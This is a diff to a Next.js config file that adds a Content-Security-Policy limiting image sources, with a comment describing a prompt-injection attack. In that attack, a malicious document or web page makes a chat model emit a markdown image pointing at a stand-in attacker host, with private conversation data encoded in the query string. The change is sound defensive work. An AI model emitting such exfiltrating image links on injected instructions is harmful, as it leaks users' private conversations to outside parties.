@@ -1,9 +1,59 @@
 import "./src/env.mjs";
 import { withSentryConfig } from "@sentry/nextjs";
 
+/**
+ * Close the prompt-injection image-exfiltration channel with a Content-Security-Policy.
+ *
+ * THE VECTOR. Model output is rendered as markdown. There is no raw-HTML/JS
+ * passthrough (rehype-raw is deliberately absent), so a malicious document,
+ * pasted text, or retrieved web page cannot make the browser run script or call
+ * fetch()/XHR/WebSocket. The ONE channel the model's text CAN make the browser
+ * hit an arbitrary host on its own is an image: `![](https://attacker/?d=…)`
+ * auto-loads, and `?d=…` carries whatever the injection told the model to encode
+ * about the user's private conversation. `safeImageUrl` used to permit any https
+ * host, so this was open.
+ *
+ * THE BOUNDARY. `img-src` is restricted to the app's own origin plus data:/blob:
+ * (and the Convex storage origin, which is where legitimate attachment, artifact
+ * and avatar images actually live). An external image URL in model output simply
+ * does not load, so there is no request to the attacker's host.
+ *
+ * DELIBERATELY NARROW. Only `img-src` is set — there is NO `default-src`, so
+ * scripts, styles, fonts and especially `connect-src` (the load-bearing Convex
+ * WebSocket, which the whole app depends on) stay completely unrestricted. This
+ * closes the one channel the model controls without risking the transport. The
+ * few defensive response headers below are the uncontroversial ones that cannot
+ * break a same-origin SPA.
+ */
+function imgSrc() {
+  const extra = new Set();
+  const convex = process.env.NEXT_PUBLIC_CONVEX_URL;
+  if (convex) {
+    try {
+      extra.add(new URL(convex).origin);
+    } catch {
+      // ignore a malformed build-time value; 'self' still covers same-origin.
+    }
+  }
+  return ["'self'", "data:", "blob:", ...extra].join(" ");
+}
+
+const securityHeaders = [
+  {
+    key: "Content-Security-Policy",
+    value: `img-src ${imgSrc()}`,
+  },
+  { key: "X-Content-Type-Options", value: "nosniff" },
+  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
+  { key: "X-Frame-Options", value: "SAMEORIGIN" },
+];
+
 /** @type {import('next').NextConfig} */
 const nextConfig = {
   transpilePackages: ["@v1/ui", "@v1/backend", "@v1/analytics", "@v1/logger"],
+  async headers() {
+    return [{ source: "/:path*", headers: securityHeaders }];
+  },
 };
 
 // Only wrap when a DSN is actually configured.
